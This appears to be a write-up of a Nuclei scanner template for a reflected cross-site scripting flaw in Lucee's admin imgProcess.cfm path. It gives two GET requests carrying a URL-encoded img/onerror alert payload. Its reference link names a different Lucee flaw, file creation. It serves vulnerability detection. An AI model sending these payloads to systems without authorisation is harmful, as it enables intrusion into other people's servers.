# Nuclei Template: Lucee - Cross-Site Scripting
**Template ID:** lucee-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`lucee-xss.yaml`)

## Vulnerability Information & PoC

## Description
Lucee contains a cross-site scripting vulnerability. It allows remote attackers to inject arbitrary JavaScript into the responses returned by the server.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm
GET {{BaseURL}}/lucee/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm
```

## References
- https://www.acunetix.com/vulnerabilities/web/lucee-server-arbitrary-file-creation/
